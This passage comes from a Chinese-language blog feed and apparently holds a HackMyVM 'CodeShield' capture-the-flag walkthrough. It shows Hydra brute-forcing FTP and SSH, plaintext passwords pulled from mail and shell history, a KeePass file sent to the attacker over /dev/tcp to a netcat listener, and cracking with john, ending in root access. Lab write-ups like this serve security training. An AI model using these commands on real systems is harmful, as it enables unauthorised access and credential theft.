Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-20 14:55:19
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 845 login tries (l:65/p:13), ~14 tries per task
[DATA] attacking ssh://192.168.205.138:22222/
[STATUS] 554.00 tries/min, 554 tries in 00:01h, 333 to do in 00:01h, 22 active
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-20 14:56:24
```

Êó†ÊûúÔºåÂÜçÊµãËØïÁàÜÁ†¥**ftpÊúçÂä°**

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ hydra -L user -P pass ftp://192.168.205.138 -I -u -f -e nsr -t 64     
Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-20 14:56:47
[DATA] max 64 tasks per 1 server, overall 64 tasks, 845 login tries (l:65/p:13), ~14 tries per task
[DATA] attacking ftp://192.168.205.138:21/
[21][ftp] host: 192.168.205.138   login: valdezk   password: Greatplace2work!
[STATUS] attack finished for 192.168.205.138 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-20 14:57:11
```

ÁàÜÁ†¥Âá∫‰∏ÄÁªÑÁî®Êà∑ÂíåÂØÜÁ†ÅÔºåÊàë‰ª¨ËøõÂéªÁúãÁúãÊúâÂï•

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ ftp 192.168.205.138
Connected to 192.168.205.138.
220 (vsFTPd 3.0.5)
Name (192.168.205.138:kali): valdezk
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls -la
229 Entering Extended Passive Mode (|||18011|)
150 Here comes the directory listing.
drwxr-x---   18 1007     1007         4096 Aug 29  2023 .
drwxr-xr-x   14 0        0            4096 Aug 26  2023 ..
-rw-------    1 1007     1007           56 Aug 29  2023 .Xauthority
-rw-rw-r--    1 1007     1007            0 Aug 28  2023 .bash_history
-rw-r--r--    1 1007     1007          220 Aug 26  2023 .bash_logout
-rw-r--r--    1 1007     1007         3771 Aug 26  2023 .bashrc
drwx------   12 1007     1007         4096 Aug 29  2023 .cache
drwx------   11 1007     1007         4096 Aug 28  2023 .config
drwx------    3 1007     1007         4096 Aug 28  2023 .local
drwx------    3 1007     1007         4096 Aug 28  2023 .mozilla
drwxrwxrwt    2 1007     1007         4096 Aug 29  2023 .pcsc10
-rw-r--r--    1 1007     1007          807 Aug 26  2023 .profile
drwx------    6 1007     1007         4096 Aug 28  2023 .thunderbird
-rw-r-----    1 1007     1007            5 Aug 29  2023 .vboxclient-clipboard-tty1-control.pid
-rw-r-----    1 1007     1007            6 Aug 28  2023 .vboxclient-clipboard-tty2-control.pid
-rw-r-----    1 1007     1007            6 Aug 28  2023 .vboxclient-clipboard-tty4-control.pid
-rw-r-----    1 1007     1007            5 Aug 29  2023 .vboxclient-draganddrop-tty1-control.pid
-rw-r-----    1 1007     1007            6 Aug 28  2023 .vboxclient-draganddrop-tty2-control.pid
-rw-r-----    1 1007     1007            6 Aug 28  2023 .vboxclient-draganddrop-tty4-control.pid
-rw-r-----    1 1007     1007            5 Aug 29  2023 .vboxclient-hostversion-tty1-control.pid
-rw-r-----    1 1007     1007            6 Aug 28  2023 .vboxclient-hostversion-tty2-control.pid
-rw-r-----    1 1007     1007            6 Aug 28  2023 .vboxclient-hostversion-tty4-control.pid
-rw-r-----    1 1007     1007            5 Aug 29  2023 .vboxclient-seamless-tty1-control.pid
-rw-r-----    1 1007     1007            6 Aug 28  2023 .vboxclient-seamless-tty2-control.pid
-rw-r-----    1 1007     1007            6 Aug 28  2023 .vboxclient-seamless-tty4-control.pid
-rw-r-----    1 1007     1007            5 Aug 29  2023 .vboxclient-vmsvga-session-tty1-control.pid
-rw-r-----    1 1007     1007            6 Aug 28  2023 .vboxclient-vmsvga-session-tty2-control.pid
-rw-r-----    1 1007     1007            6 Aug 28  2023 .vboxclient-vmsvga-session-tty4-control.pid
-rw-r--r--    1 1007     1007        18728 Aug 29  2023 .xorgxrdp.10.log
-rw-------    1 1007     1007         3985 Aug 29  2023 .xsession-errors
drwxr-xr-x    2 1007     1007         4096 Aug 28  2023 Desktop
drwxr-xr-x    2 1007     1007         4096 Aug 28  2023 Documents
drwxr-xr-x    2 1007     1007         4096 Aug 28  2023 Downloads
drwxr-xr-x    2 1007     1007         4096 Aug 28  2023 Music
drwxr-xr-x    2 1007     1007         4096 Aug 28  2023 Pictures
drwxr-xr-x    2 1007     1007         4096 Aug 28  2023 Public
drwxr-xr-x    2 1007     1007         4096 Aug 28  2023 Templates
drwxr-xr-x    2 1007     1007         4096 Aug 28  2023 Videos
drwx------    3 1007     1007         4096 Aug 28  2023 snap
drwxrwxr-t    2 1007     1007         4096 Aug 29  2023 thinclient_drives
```

ËøõÊù•ÂèëÁé∞Êàë‰ª¨‰Ωç‰∫éÂÆ∂ÁõÆÂΩï„ÄÇÂèàÂà∞‰∏ÄÂπ¥‰∏ÄÂ∫¶ÁöÑÊâæÂÆùËóèÁéØËäÇ

```bash
ftp&gt; pwd
Remote directory: /home/valdezk/.thunderbird/fx2h7mhy.default-release/ImapMail/mail.codeshield.hmv
```

Âú®ËØ•ÁõÆÂΩï‰∏ãÊåñÊéòÂà∞‰∫ÜÂÆùËóèüòÅ

![Image](https://github.com/user-attachments/assets/c909abf0-51cf-42b9-9e4b-d7534b6697cc)

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ cat Trash
From - Mon Aug 28 18:38:57 2023
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Return-Path: &lt;t.mitchell@codeshield.hmv&gt;
Delivered-To: k.valdez@codeshield.hmv
Received: from mail.codeshield.hmv (mail.codeshield.hmv [127.0.0.1])
        by mail.codeshield.hmv (Postfix) with ESMTP id 4RXwV61k4Jz62kW
        for &lt;k.valdez@codeshield.hmv&gt;; Sat, 26 Aug 2023 12:04:30 +0000 (UTC)
Authentication-Results: mail.codeshield.hmv (amavisd-new); dkim=pass
        reason='pass (just generated, assumed good)' header.d=codeshield.hmv
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=codeshield.hmv;
         h=content-transfer-encoding:content-type:message-id:user-agent
        :subject:to:from:date:mime-version; s=dkim; t=1693051468; x=
        1695643469; bh=9j2IFk0ZpW4pfmvikNYY7hFOEsr+Ze1bR/Ba4zdoUeU=; b=V
        /krnK4TR1tqxJUcKOs1elfa2D4X6hovoYkOpGBtxQgk2+xA4ADTHUnwNcrG4qRh2
        PG7dbgm+zxZjqfa3x2cdc11BQE9zs4n4D3Hi+aBVUkYFQsQXoWdIpQ7jHntkTSrI
        Mq0tEEuTXmKD/s7YDseYOq1y5kcUaANPYMdVmaf+C/9q2HqEFY5Kzmd+7xlInUIs
        nizkQe+0XeZ6l9xmdDPTQVFQS0O98zTYQgMZ/Hd3oQniIF1aB5TocWfNvOcWbDeI
        S5Cm7IFXX2zs4i8h9j2CTohmYjtAoR+InN2jQYuks3VZaqGaDEfXy5ZfdruFbbrh
        Liceo3ueN5jYMdBS8Fl3A==
X-Virus-Scanned: Debian amavisd-new at mail.codeshield.hmv
Received: from mail.codeshield.hmv ([127.0.0.1])
        by mail.codeshield.hmv (mail.codeshield.hmv [127.0.0.1]) (amavisd-new, port 10026)
        with ESMTP id kyzCgpKZGZvf for &lt;k.valdez@codeshield.hmv&gt;;
        Sat, 26 Aug 2023 12:04:28 +0000 (UTC)
Received: from localhost (mail.codeshield.hmv [127.0.0.1])
        by mail.codeshield.hmv (Postfix) with ESMTPSA id 4RXwV43FB8z62kJ
        for &lt;k.valdez@codeshield.hmv&gt;; Sat, 26 Aug 2023 12:04:27 +0000 (UTC)
MIME-Version: 1.0
Date: Sat, 26 Aug 2023 12:04:26 +0000
From: t.mitchell@codeshield.hmv
To: k.valdez@codeshield.hmv
Subject: Need some help for data analytics
User-Agent: Roundcube Webmail
Message-ID: &lt;7d81f2aca5fd7fb5af8609e03cbe1b3a@codeshield.hmv&gt;
X-Sender: t.mitchell@codeshield.hmv
Content-Type: text/plain; charset=US-ASCII;
 format=flowed
Content-Transfer-Encoding: 7bit

Hi Kevin,

Great that you want to help me with the tooling for data analysis. 
Patrick has set some things up, but I can't get it to work properly. As 
just discussed during coffee, I will send you my login details to so 
that you can fix it under my account and that I can continue working.

Password: D@taWh1sperer!

Thanks buddy!

Thomas
                                                

Âó®ÔºåÂáØÊñáÔºå

ÂæàÈ´òÂÖ¥‰Ω†ÊÉ≥Â∏ÆÂä©ÊàëÂºÄÂèëÊï∞ÊçÆÂàÜÊûêÂ∑•ÂÖ∑„ÄÇ
Â∏ïÁâπÈáåÂÖãÂ∑≤ÁªèËÆæÁΩÆ‰∫Ü‰∏Ä‰∫õ‰∏úË•øÔºå‰ΩÜÊàëÊó†Ê≥ïËÆ©ÂÆÉÊ≠£Â∏∏Â∑•‰Ωú„ÄÇÊ≠£Â¶Ç
Êàë‰ª¨ÂñùÂíñÂï°Êó∂ËÆ®ËÆ∫ÁöÑÈÇ£Ê†∑ÔºåÊàë‰ºöÂ∞ÜÊàëÁöÑÁôªÂΩïËØ¶ÁªÜ‰ø°ÊÅØÂèëÈÄÅÁªô‰Ω†Ôºå
ËøôÊ†∑‰Ω†Â∞±ÂèØ‰ª•Âú®
ÊàëÁöÑË¥¶Êà∑‰∏ã‰øÆÂ§çÂÆÉÔºåÊàëÂ∞±ÂèØ‰ª•ÁªßÁª≠Â∑•‰Ωú‰∫Ü„ÄÇ

ÂØÜÁ†ÅÔºöD@taWh1spererÔºÅ

Ë∞¢Ë∞¢‰ºôËÆ°ÔºÅ

ÊâòÈ©¨ÊñØ
```

Ëøô‰∏™Áî®Êà∑Â∫îËØ•‰∏çÊòØftp‰∫ÜÂêßÔºåÊî∂Êî∂Á•ûÈÄöÂêßÔºåËØ∑Ëµê‰∫àÊàë‰∏Ä‰∏™ssh

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ hydra -L user -p D@taWh1sperer! ssh://192.168.205.138 -I -u -f -e nsr -t 64 -s 22222
Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-20 15:15:11
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 260 login tries (l:65/p:4), ~5 tries per task
[DATA] attacking ssh://192.168.205.138:22222/
[22222][ssh] host: 192.168.205.138   login: mitchellt   password: D@taWh1sperer!
[STATUS] attack finished for 192.168.205.138 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-20 15:15:18

‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ ssh mitchellt@192.168.205.138 -p 22222
The authenticity of host '[192.168.205.138]:22222 ([192.168.205.138]:22222)' can't be established.
ED25519 key fingerprint is SHA256:Y+iV2eHvzSBp6ZbF+2VqTJdZ5+XyH5tVaxNCzS7tp3I.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.205.138]:22222' (ED25519) to the list of known hosts.
             @@@                          
      @@@@@@@@@  @@@@@@                   
 @@@@@@@@@@@@@@          (@@              
 @@@@@@@@@@@@@@           @@    ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïó‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïó     ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó                                 
 @@@@@@@@@@@@@@           @@   ‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó           
  @@@@@@@@@@@@@          @@    ‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë           
  @@@@@@@@@@@@@         @@@    ‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  ‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë           
    @@@@@@@@@@@        @@      ‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù           
     @@@@@@@@@@      @@@        ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù            
        @@@@@@@   @@@                     
           @@@@@@@                                                         

  _______________________________________________________________________________________________________
 |  _WARNING: This system is restricted to authorized users!___________________________________________  |
 | |                                                                                                   | |
 | | IT IS AN OFFENSE TO CONTINUE WITHOUT PROPER AUTHORIZATION.                                        | |
 | |                                                                                                   | |
 | | This system is restricted to authorized users.                                                    | | 
 | | Individuals who attempt unauthorized access will be prosecuted.                                   | | 
 | | If you're unauthorized, terminate access now!                                                     | | 
 | |                                                                                                   | |
 | |                                                                                                   | |
 | |___________________________________________________________________________________________________| |
 |_______________________________________________________________________________________________________|
mitchellt@192.168.205.138's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-79-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jan 20 07:15:11 AM UTC 2025

  System load:  0.640625           Processes:               240
  Usage of /:   29.1% of 47.93GB   Users logged in:         0
  Memory usage: 59%                IPv4 address for enp0s3: 192.168.205.138
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

10 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
New release '24.04.1 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


mitchellt@codeshield:~$ id
uid=1006(mitchellt) gid=1006(mitchellt) groups=1006(mitchellt)

```

# 3.ÊèêÊùÉ

```bash
mitchellt@codeshield:~$ ls -la
total 112
drwxr-x--- 17 mitchellt mitchellt 4096 Aug 30  2023 .
drwxr-xr-x 14 root      root      4096 Aug 26  2023 ..
-rw-------  1 mitchellt mitchellt  209 Aug 30  2023 .bash_history
-rw-r--r--  1 mitchellt mitchellt  220 Aug 26  2023 .bash_logout
-rw-r--r--  1 mitchellt mitchellt 3771 Aug 26  2023 .bashrc
drwx------ 11 mitchellt mitchellt 4096 Jan 20 07:14 .cache
drwx------ 12 mitchellt mitchellt 4096 Aug 29  2023 .config
drwxr-xr-x  2 mitchellt mitchellt 4096 Aug 28  2023 Desktop
drwxr-xr-x  2 mitchellt mitchellt 4096 Aug 28  2023 Documents
drwxr-xr-x  2 mitchellt mitchellt 4096 Aug 28  2023 Downloads
-rw-------  1 mitchellt mitchellt   20 Aug 29  2023 .lesshst
drwx------  3 mitchellt mitchellt 4096 Aug 28  2023 .local
drwxrwxr-x  6 mitchellt mitchellt 4096 Aug 30  2023 mining
drwx------  3 mitchellt mitchellt 4096 Aug 28  2023 .mozilla
drwxr-xr-x  2 mitchellt mitchellt 4096 Aug 28  2023 Music
drwxr-xr-x  2 mitchellt mitchellt 4096 Aug 28  2023 Pictures
-rw-r--r--  1 mitchellt mitchellt  807 Aug 26  2023 .profile
drwxr-xr-x  2 mitchellt mitchellt 4096 Aug 28  2023 Public
drwx------  3 mitchellt mitchellt 4096 Aug 29  2023 snap
drwxr-xr-x  2 mitchellt mitchellt 4096 Aug 28  2023 Templates
drwx------  6 mitchellt mitchellt 4096 Aug 28  2023 .thunderbird
-rwxrwx---  1 mitchellt mitchellt 2401 Aug 28  2023 user.txt
-rw-r-----  1 mitchellt mitchellt    6 Aug 30  2023 .vboxclient-clipboard-tty2-control.pid
-rw-r-----  1 mitchellt mitchellt    6 Aug 30  2023 .vboxclient-draganddrop-tty2-control.pid
-rw-r-----  1 mitchellt mitchellt    6 Aug 30  2023 .vboxclient-hostversion-tty2-control.pid
-rw-r-----  1 mitchellt mitchellt    6 Aug 30  2023 .vboxclient-seamless-tty2-control.pid
-rw-r-----  1 mitchellt mitchellt    6 Aug 30  2023 .vboxclient-vmsvga-session-tty2-control.pid
drwxr-xr-x  2 mitchellt mitchellt 4096 Aug 28  2023 Videos
mitchellt@codeshield:~$ cat .bash_history
echo 'EARL!YP7DeVel@OP'| su - earlyp -c 'cp -r /home/earlyp/Development/mining .'
echo 'EARL!YP7DeVel@OP'| su - earlyp -c 'cp -r /home/earlyp/Development/mining /tmp'
cp -r /tmp/mining .
ls
cd mining/
ls
exit
mitchellt@codeshield:~$ su - earlyp
Password: 
earlyp@codeshield:~$ sudo -l
[sudo] password for earlyp: 
Sorry, user earlyp may not run sudo on mail.
earlyp@codeshield:~$ ls -la
total 116
drwxr-x--- 19 earlyp earlyp 4096 Aug 29  2023 .
drwxr-xr-x 14 root   root   4096 Aug 26  2023 ..
-rw-------  1 earlyp earlyp   36 Aug 29  2023 .bash_history
-rw-r--r--  1 earlyp earlyp  220 Jan  6  2022 .bash_logout
-rw-r--r--  1 earlyp earlyp 3771 Jan  6  2022 .bashrc
drwx------ 12 earlyp earlyp 4096 Aug 23  2023 .cache
drwx------ 16 earlyp earlyp 4096 Aug 28  2023 .config
drwxr-xr-x  2 earlyp earlyp 4096 Aug 22  2023 Desktop
drwxrwxr-x  3 earlyp earlyp 4096 Aug 28  2023 Development
drwxr-xr-x  2 earlyp earlyp 4096 Aug 28  2023 Documents
drwxr-xr-x  5 earlyp earlyp 4096 Aug 23  2023 Downloads
drwx------  2 earlyp earlyp 4096 Aug 28  2023 .gnupg
drwx------  3 earlyp earlyp 4096 Aug 22  2023 .local
drwxrwxr-x  6 earlyp earlyp 4096 Aug 29  2023 mining
drwxrwxr-x  2 earlyp earlyp 4096 Aug 23  2023 .mono
drwxr-xr-x  2 earlyp earlyp 4096 Aug 22  2023 Music
drwxr-xr-x  3 earlyp earlyp 4096 Aug 23  2023 Pictures
-rw-r--r--  1 earlyp earlyp  807 Jan  6  2022 .profile
drwxr-xr-x  2 earlyp earlyp 4096 Aug 22  2023 Public
-rw-rw-r--  1 earlyp earlyp  233 Aug 23  2023 .recently-used
drwx------  3 earlyp earlyp 4096 Aug 22  2023 snap
drwx------  2 earlyp earlyp 4096 Aug 22  2023 .ssh
-rw-r--r--  1 earlyp earlyp    0 Aug 22  2023 .sudo_as_admin_successful
drwxr-xr-x  2 earlyp earlyp 4096 Aug 22  2023 Templates
-rw-r-----  1 earlyp earlyp    6 Aug 28  2023 .vboxclient-clipboard-tty2-control.pid
-rw-r-----  1 earlyp earlyp    6 Aug 28  2023 .vboxclient-draganddrop-tty2-control.pid
-rw-r-----  1 earlyp earlyp    6 Aug 28  2023 .vboxclient-hostversion-tty2-control.pid
-rw-r-----  1 earlyp earlyp    6 Aug 28  2023 .vboxclient-seamless-tty2-control.pid
-rw-r-----  1 earlyp earlyp    6 Aug 28  2023 .vboxclient-vmsvga-session-tty2-control.pid
drwxr-xr-x  2 earlyp earlyp 4096 Aug 22  2023 Videos
earlyp@codeshield:~$ cat .bash_history
cd ~
ls
cd Development/
ls
pwd
exit
earlyp@codeshield:~$ cd Development
earlyp@codeshield:~/Development$ ls -la
total 12
drwxrwxr-x  3 earlyp earlyp 4096 Aug 28  2023 .
drwxr-x--- 19 earlyp earlyp 4096 Aug 29  2023 ..
drwxrwxr-x  6 earlyp earlyp 4096 Aug 28  2023 mining
earlyp@codeshield:~/Development$ cd mining/
earlyp@codeshield:~/Development/mining$ ls -al
total 92
drwxrwxr-x 6 earlyp earlyp 4096 Aug 28  2023 .
drwxrwxr-x 3 earlyp earlyp 4096 Aug 28  2023 ..
-rw-rw-r-- 1 earlyp earlyp  298 Aug 28  2023 circle.yml
-rw-rw-r-- 1 earlyp earlyp  358 Aug 28  2023 CONTRIBUTING.rst
-rw-rw-r-- 1 earlyp earlyp   46 Aug 28  2023 .coveralls.yml
-rw-rw-r-- 1 earlyp earlyp  634 Aug 28  2023 docker-compose.yml
-rw-rw-r-- 1 earlyp earlyp  938 Aug 28  2023 Dockerfile
drwxrwxr-x 4 earlyp earlyp 4096 Aug 28  2023 docs
drwxrwxr-x 8 earlyp earlyp 4096 Aug 28  2023 .git
-rw-rw-r-- 1 earlyp earlyp  439 Aug 28  2023 .gitignore
-rw-rw-r-- 1 earlyp earlyp  100 Aug 28  2023 .gitmodules
-rw-rw-r-- 1 earlyp earlyp 1081 Aug 28  2023 LICENSE
-rw-rw-r-- 1 earlyp earlyp  794 Aug 28  2023 Makefile
-rw-rw-r-- 1 earlyp earlyp 3181 Aug 28  2023 manage.py
-rw-rw-r-- 1 earlyp earlyp  161 Aug 28  2023 MANIFEST.in
drwxrwxr-x 9 earlyp earlyp 4096 Aug 28  2023 mining
-rw-rw-r-- 1 earlyp earlyp 3501 Aug 28  2023 README.rst
-rw-rw-r-- 1 earlyp earlyp   34 Aug 28  2023 requirements_dev.txt
-rw-rw-r-- 1 earlyp earlyp  261 Aug 28  2023 requirements.txt
drwxrwxr-x 2 earlyp earlyp 4096 Aug 28  2023 scripts
-rw-rw-r-- 1 earlyp earlyp  230 Aug 28  2023 setup.cfg
-rw-rw-r-- 1 earlyp earlyp 2366 Aug 28  2023 setup.py
-rw-rw-r-- 1 earlyp earlyp  312 Aug 28  2023 .travis.yml

earlyp@codeshield:~/Development/mining$ cd ~
earlyp@codeshield:~$ cd Desktop/
earlyp@codeshield:~/Desktop$ ls -al
total 8
drwxr-xr-x  2 earlyp earlyp 4096 Aug 22  2023 .
drwxr-x--- 19 earlyp earlyp 4096 Aug 29  2023 ..
earlyp@codeshield:~/Desktop$ cd ~/Documents/
earlyp@codeshield:~/Documents$ ls -al
total 12
drwxr-xr-x  2 earlyp earlyp 4096 Aug 28  2023 .
drwxr-x--- 19 earlyp earlyp 4096 Aug 29  2023 ..
-rw-------  1 earlyp earlyp 1918 Aug 28  2023 Passwords.kdbx
```

Êã∑ËøáÂéªÁ†¥Ëß£‰∏Ä‰∏ã

```bash
earlyp@codeshield:~/Documents$ cat Passwords.kdbx &gt; /dev/tcp/192.168.205.141/7777

#kali
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nc -lvnp 7777 &gt; Passwords.kdbx               
listening on [any] 7777 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.138] 53802
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ keepass2john Passwords.kdbx &gt; hash
                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 3225806 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:04:14 0.01% (ETA: 2025-02-13 23:25) 0g/s 8.313p/s 8.313c/s 8.313C/s laurita..myfamily
0g 0:00:05:31 0.02% (ETA: 2025-02-14 05:03) 0g/s 8.264p/s 8.264c/s 8.264C/s onlyme..victoria1
0g 0:00:08:56 0.03% (ETA: 2025-02-14 05:14) 0g/s 8.228p/s 8.228c/s 8.228C/s priscila..a1b2c3d4
Session aborted
```

ÁàÜÁ†¥‰∫ÜÂÖ´ÂàÜÈíüËøòÊ≤°Âá∫Êù•ÔºåÂÆûÂú®Á≠â‰∏ç‰∏ãÂéª‰∫ÜÔºåÊàëÁõ¥Êé•ÂéªÂÖ∂‰ªñÂ§ß‰Ω¨ÈÇ£ÈáåÂÅ∑‰∫Ü‰∏™ÂØÜÁ†Å`mandalorian`ÔºåÊíï.....Ëøô‰∏™ÂØÜÁ†ÅÂú®868083Ë°åÔºåÊúÄÂ∞èÁöÑÈÉΩÂú®20451Ë°å

![Image](https://github.com/user-attachments/assets/53d42048-f033-408e-b311-b7ae95f72946)

Âø´ÈÄüÁöÑÂàáÂõûÂéªÊç¢rootÔºà‰∏çÁÑ∂‰Ω†Ë¶ÅÈáçÊñ∞ÂèåÂáªÔºåÂÆÉÂ§çÂà∂ÊúâÊó∂Èó¥ÈôêÂà∂Ôºâ

```bash
earlyp@codeshield:~/Documents$ su -
Password: 
root@codeshield:~# id
uid=0(root) gid=0(root) groups=0(root)

```

# 4.ÂêéËØù

ÂéªÁúã**ll104567**Â§ß‰Ω¨ÁöÑwpÂèëÁé∞ÔºåÈÇ£‰∏™Áî®Êà∑‰∏çÁî®Ëøô‰πàÈ∫ªÁÉ¶Ëé∑ÂèñÔºå‰Ω†Áõ¥Êé•Áúã‰ªñËôöÊãüÊú∫ÂõæÂΩ¢ÂåñÁïåÈù¢ÁöÑÁôªÂΩïÂ∞±Â•Ω‰∫ÜÔºåÈÇ£ÈáåÂÖ®ÊúâÔºåËÄå‰∏î**valdezk ftp**ÈÇ£ÈáåÔºå‰ΩúËÄÖÊòØËÆ©Êàë‰ª¨ÁôªÂΩïÈÇ£‰∏™**web mail**Êü•ÁúãÁöÑÔºå‰∏çÊòØÁõ¥Êé•ÁúãÊ∫êÁ†Å......sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_CodeShield.html</guid><pubDate>Fri, 27 Jun 2025 09:32:51 +0000</pubDate></item><item><title>hmv_Chromatica</title><link>https://7r1UMPHK.github.io/post/hmv_Chromatica.html</link><description># hmv_Chromatica

**Èù∂Êú∫**Ôºöhttps://hackmyvm.eu/machines/machine.php?vm\=Chromatica
**ÈöæÂ∫¶**ÔºöÁªøËâ≤
**ÁõÆÊ†á IP**Ôºö192.168.205.215
